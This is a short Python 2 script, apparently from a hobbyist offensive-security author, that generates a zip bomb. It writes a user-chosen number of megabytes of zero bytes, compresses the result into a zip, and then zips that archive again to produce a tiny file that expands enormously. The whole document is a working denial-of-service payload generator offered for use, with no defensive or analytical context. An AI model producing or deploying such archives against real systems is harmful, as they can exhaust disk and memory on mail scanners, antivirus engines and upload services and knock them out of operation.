#!/usr/bin/env python
# Author : L0V3R IN MSF
# Date : 10,9,2016


import sys,zipfile,os


filename = "zipbomb.bin"
zipfilename = filename.split(".")[0]+".zip"
zipfilenametmp = zipfilename+".tmp"

try:
	GB = raw_input("MB Size : ")
	if not GB:
		exit(1)
	GB = int(GB) # check only number 
	print "Creating bomb . . . "
	with open(filename,'wb') as f:
		OneMB = 1024*1024
		for i in range(GB):
			sys.stdout.write("\rWriting %d MB"%(i+1))
			sys.stdout.flush()
			f.write("\0"*OneMB) # write 1MB data
	f.close()
	print "\nZipping bomb [ %s ] . . . "%zipfilename
	try:
		import zlib
		mode = zipfile.ZIP_DEFLATED
	except:
		mode = zipfile.ZIP_STORED
	# first create zipfile
	zip = zipfile.ZipFile(zipfilename,'w',mode)
	zip.write(filename)
	zip.close()

	# zip again with name .tmp
	print "Zipping bomb again . . ."
	zip = zipfile.ZipFile(zipfilenametmp,'w',mode)
	zip.write(zipfilename)
	zip.close()
	# rename .tmp to .zip file
	os.rename(zipfilenametmp,zipfilename)
	print "Cleaning tmp files"
	os.remove(filename) # del the orginal bomb file
	print "Final Zip Bomb save [ %s %d bytes ]"%(zipfilename,os.path.getsize(zipfilename))
	print "Done!"
except ValueError:
	print "Only Number!"
except KeyboardInterrupt:
	print "KeyboardInterrupt!"
	exit(1)